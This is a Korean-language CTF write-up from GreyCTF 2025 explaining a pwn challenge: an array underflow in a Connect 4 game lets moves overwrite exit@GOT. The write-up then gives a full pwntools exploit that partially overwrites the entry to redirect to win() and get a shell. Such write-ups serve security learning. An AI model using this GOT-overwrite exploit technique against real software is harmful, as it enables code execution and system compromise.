---
tags: [ctf, write-up, pwn, system]		
---
![image.png](/assets/img/greyctf2025/image1.png)

---

해당 프로그램은 사용자의 입력을 받아 Connect 4 보드 게임을 시뮬레이션하는 콘솔 기반 프로그램이다. 플레이어는 8칸짜리 열(column)에 돌을 떨어뜨릴 수 있으며, 각 열은 최대 8개의 돌을 담을 수 있다. 이 제한을 초과하면 가장 아래의 돌이 제거되고 위의 돌들이 한 칸씩 아래로 내려오며 새로운 돌이 맨 위에 삽입된다.

게임 보드는 총 8행 8열(64바이트)의 크기를 가지며, 내부적으로 char board[8][8] 구조로 구현되어 있다. 하지만 열(column)에 8개 이상 돌을 삽입할 경우, 보드의 가장 아래에 있는 원소가 제거되면서 위의 값들이 내려오고, 새로운 값이 배열의 위(더 낮은 주소)인 board[-1][col]에 쓰이게 된다.

이를 코드를 통해 확인 해보면,

프로그램 내부에는 다음과 같은 전역 배열이 선언되어 있다.

```c
char board[8][8];
```

이는 총 64바이트(8행 × 8열) 크기의 2차원 배열로, 실제 메모리 상에는 연속된 메모리 공간으로 할당된다.

 

게임 중 사용자가 특정 열(column)에 8개 이상의 돌을 삽입하려고 하면, game() 함수 내부의 다음 코드가 실행된다

```c
int lastfree = 0;
while (board[lastfree][colint] == player1symbol || board[lastfree][colint] == player2symbol) {
    lastfree--;
}
```

위 코드에서 lastfree-- 연산이 경계 검사를 수행하지 않은 채 음수로 진행되므로, C언어의 특성상 board[-1][colint], board[-2][colint] 와 같은 배열 범위 밖의 메모리에 쓰기(write)가 발생하게 된다. 이는 스택 또는 전역 영역의 언더플로우에 해당하며, 인접한 전역 변수를 덮는 데 사용될 수 있다.

이 언더플로우 취약점을 이용해 보드 배열보다 위쪽 메모리에 위치한 중요한 구조체, 특히 GOT(Global Offset Table) 항목을 덮는 것이 가능하다. 

![image.png](/assets/img/greyctf2025/image2.png)

```
[exit@GOT]
    ↑       ← board[-8][col]
    │
[ board[0][0] ]
    ↓
[ board[7][7] ]
```

위의 이미지와 그림을 참고하면, exit@GOT 주소가 board[0][0]보다 64바이트 위쪽에 위치해 있는 것을 확인할 수 있다. 즉, 같은 열에 16개 이상의 돌을 삽입하면 board[-8][0] 위치에 접근할 수 있으며, 이는 exit@GOT 주소를 덮는 것과 동일하다.

이 프로그램은 종료 시 exit() 함수를 호출한다. 따라서 exit@GOT의 값을 조작하려 win()로 리디렉션하면 쉘 획득이 가능하다.

![image.png](/assets/img/greyctf2025/image3.png)
PIE(Position Independent Executable)가 적용되어있기 때문에 해당 바이너리의 모든 섹션(.text, .got, .bss 등)은 실행 시 무작위 PIE base에 따라 재배치된다. 따라서 win() 함수의 절대 주소도 실행할 때마다 바뀌지만, .text 섹션 내 오프셋은 고정되어 있어 하위 12비트(즉, 하위 2바이트)는 변하지 않는다.

```bash
pwndbg> p win
$1 = 0x555555555fc9 <win>
```

win() 함수는 .text 기준 고정 오프셋인 0x5fc9에 존재한다.

exit@GOT는 프로그램 실행 초기에는 아직 실제 libc의 exit() 주소가 기록되지 않은 상태이다.

exit()이 호출되면, PLT의 stub가 동작하여 GOT를 참조하지만, 우리가 그 이전에 GOT 항목의 하위 2바이트만 win()의 offset으로 덮으면, 해당 위치로 프로그램 흐름이 리디렉션된다.

이 stub 주소도 .text 섹션 내부에 존재하므로, 마찬가지로 PIE base가 동일하게 적용된다.

결과적으로 exit@GOT에 저장된 초기값과 win() 함수는 모두 동일한 PIE base를 공유하고 있으므로,

상위 6바이트가 동일하게 되고, 하위 2바이트만 덮으면 정확히 win() 주소로 리디렉션할 수 있다.

여기서 중요한 것은 알아낸 win의 주소는 PIE base가 0x555555554000일 때의 기준, 오프셋 1fc9가 적용된 값이다.

ASLR이 적용된 경우 PIE base는 0x5555555554xxx 까지가 변경되므로, 리모트 환경에서 win()함수의 하위 2바이트는 5fc9가 아닐수도 있다.

ex)

```bash
PIE base = 0x5555555557000 // 끝에 000은 고정
win() = 0x5555555558fc9 // 하위 2바이트가 8fc9
```

따라서 ASLR이 적용된 PIE base의 하위 2바이트가 4000으로 끝날 때까지 익스코드를 반복 실행하여야 한다. 

### 익스 흐름

1. 초기 심볼로 b'\xc9'와 b'\x5f'을 설정하여, 언더플로우 시 리틀 엔디안 순서로 0x5fc9가 exit@GOT에 기록되도록 한다.
2. send_positions() 함수를 통해 특정 열(ex: 0번, 1번)에 번갈아가며 총 16개의 돌을 삽입하면,
   board[-8][col]까지 접근 가능해져 exit@GOT의 값을 덮을 수 있다. 
3. 이후 프로그램이 exit()을 호출할 때(0~7을 제외한 값을 보내면 호출됨), GOT를 통해 참조되는 주소가 우리가 덮은 0x5fc9이므로, 실제로는 win() 함수가 호출되어 쉘을 획득하게 된다.
4. 쉘 획득에 실패할 경우 반복한다.

### exploit.py

```c
from pwn import process, remote
import sys

def send_positions(p, one, two):
    print(f"Sending positions: {one} and {two}")
    p.recvuntil(b"> ")
    p.sendline(one)
    p.recvuntil(b"> ")
    p.sendline(two)

def got_shell(p):
    p.recvuntil(b"> ")
    p.sendline(b"a")
    p.sendline(b"echo success")

    try:
        p.recvuntil(b"success", timeout=20)
        return True
    except EOFError:
        return False

ctr = 0

while True:
    ctr += 1

    try:
        p = remote("challs.nusgreyhats.org", port=33102, timeout=15)
        
        send_positions(p, b"\xc9", b"\x5f")
        for i in range(16):
            if i % 2 == 0:
                send_positions(p, b"0", b"1")
            else:
                send_positions(p, b"1", b"0")

        p.sendline(b"")

        if got_shell(p):
            print(f"[+] success (try {ctr})")
            p.sendline(b"cat flag.txt")
            print(p.recvuntil(b"}").decode().strip())
            sys.exit()
        else:
            print(f"[-] failed (try {ctr})")
            p.close()

    except (BrokenPipeError, EOFError) as e:
        print(f"[!] Connection error on try {ctr}: {e}")
        try:
            p.close()
        except:
            pass
        continue

```

![image.png](/assets/img/greyctf2025/image4.png)